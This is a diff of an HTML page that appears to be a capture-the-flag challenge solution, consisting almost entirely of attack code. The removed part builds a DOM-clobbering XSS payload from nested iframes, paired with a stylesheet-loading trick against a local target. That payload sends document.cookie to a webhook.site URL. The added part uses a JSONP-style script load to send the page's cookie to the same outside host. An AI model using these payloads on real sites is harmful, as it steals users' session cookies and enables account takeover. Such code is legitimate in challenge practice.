@@ -1,47 +1,34 @@
 <!DOCTYPE html>
 <html>
+
 <body>
-  <script>
-    
-    var arr=['h', 'a' , 'p', 'p' , 'y' , '_' , 'n' , 'e' , 'w' , '_' , 'y' , 'e' , 'a' , 'r' , '_' , 'h' , 'a' , 'c' , 'k' , 'e' , 'r' , 's']
-    
-    let clobbering_value = 'location.replace(`https://webhook.site/e3ab22b6-1f71-4947-b427-635458e273a9/?flag=`+document.cookie)'
-
-    // let clobbering_value = 'alert(1);';
-    const chainIframes = function(clobbering_target, n){
-        if (clobbering_target.length - 2 === n){
-            return `<a id='${clobbering_target[n]}' name='${clobbering_target[n+1]}' ${clobbering_value ? ` href=cid:${clobbering_value}` : ''}></a><a id='${clobbering_target[n]}'>`
-            }   
-
-
-        let html = `<iframe name=${clobbering_target[n]} srcdoc="\n${"  ".repeat(n + 1) + chainIframes(clobbering_target, n + 1) + "\n" + "  ".repeat(n)}"></iframe>`;
-
-        if (n === 1) html = html.replace(/"/g, '&quot;')
-        else if (n > 1) html = html.replace(/"/g, '&quot;').replace(/&/g, "&amp;");
-
-        return html;
-    }
-
-    let dom_clobbering_part=chainIframes(arr, 0);
-    console.log(dom_clobbering_part)
-
-    payload = dom_clobbering_part + '<link rel="stylesheet" href="?0"/><link rel="stylesheet" href="?1"/><link rel="stylesheet" href="?2"/><link rel="stylesheet" href="?3"/><link rel="stylesheet" href="?4"/><link rel="stylesheet" href="?5"/><link rel="stylesheet" href="?6"/><link rel="stylesheet" href="?7"/><link rel="stylesheet" href="?8"/><link rel="stylesheet" href="?9"/><link rel="stylesheet" href="?10"/><link rel="stylesheet" href="?11"/><link rel="stylesheet" href="?12"/><link rel="stylesheet" href="?13"/><link rel="stylesheet" href="?14"/><link rel="stylesheet" href="?15"/><link rel="stylesheet" href="?16"/><link rel="stylesheet" href="?17"/><link rel="stylesheet" href="?18"/><link rel="stylesheet" href="?19"/><link rel="stylesheet" href="?20"/><link rel="stylesheet" href="?21"/><link rel="stylesheet" href="?22"/><link rel="stylesheet" href="?23"/><link rel="stylesheet" href="?24"/>'
-    payload = encodeURIComponent(payload)
-    console.log(payload)
-
-    function startStyle() {
-        for(let i=0; i<2000; i++){
-            let el = document.createElement('link')
-            el.rel='stylesheet'
-            el.href = 'http://localhost:9000/?'+i
-            document.body.appendChild(el)
-        }
-    }
-    startStyle()
-    setTimeout(() => {
-      window.open('http://localhost:9000/?p=' + payload)
-    }, 100)
-
-  </script>
+    Challenge Solution HTML
 </body>
+<script>
+    const jsonp = (opts = {}) => {
+        opts.url = `${opts.url}?callback=${opts.callback}`;
+
+        opts.url += `&flag=${document.cookie}`;
+
+        const script = document.createElement('script');
+        script.src = opts.url;
+
+        script.onload = () => {
+            document.body.removeChild(script);
+        }
+
+        document.body.appendChild(script);
+    };
+
+
+    jsonp({
+        url: 'https://webhook.site/e3ab22b6-1f71-4947-b427-635458e273a9/',
+        callback: 'getData'
+    });
+
+    function getData(data) {
+        console.log(data);
+    }
+</script>
+
 </html>
